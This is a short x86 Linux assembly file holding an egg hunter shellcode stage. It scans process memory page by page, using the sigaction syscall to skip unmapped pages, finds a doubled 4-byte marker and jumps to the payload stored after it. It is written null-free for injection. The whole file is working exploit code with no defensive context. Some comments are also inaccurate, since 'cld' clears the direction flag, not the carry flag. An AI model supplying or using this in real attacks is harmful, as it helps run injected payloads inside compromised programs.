global _start                   

section .text
_start:
        cld 		;clear carry flag to make sure that scasd is working
        xor edx,edx 	;clear edx
        xor ecx,ecx 	;clear ecx

next_page:
        or cx,0xfff 	;add 4095 - this is from the output of command "getconf PAGE_SIZE"=4096
		    	;to avoid zeroes in shellcode, we put 4095 and increase it by 1
next_addr:
        inc ecx ;PAGE_SIZE=4096

;;     lea ebx, [ecx]	;[ecx+0x4] proper alignment, avoiding SIGSEGV in first scasd

	push 0x43 	;sigaction() syscall
	pop eax;
	int 0x80 	; make the syscall
	
	cmp al, 0xf2 	;test for fault EFAULT
	je next_page
	mov eax, 0x696c6162	; egg code to find
	mov edi,ecx 	;edi contains the address to look for
	scasd		;look for the egg, increase edi with +4 if match
	jnz next_addr	;no marker found, jump to next address
	scasd		;look for the egg, increase edi with +4 if match
	jnz next_addr	;no marker found, jump to next address
	jmp edi		;found egg, jump to shellcode

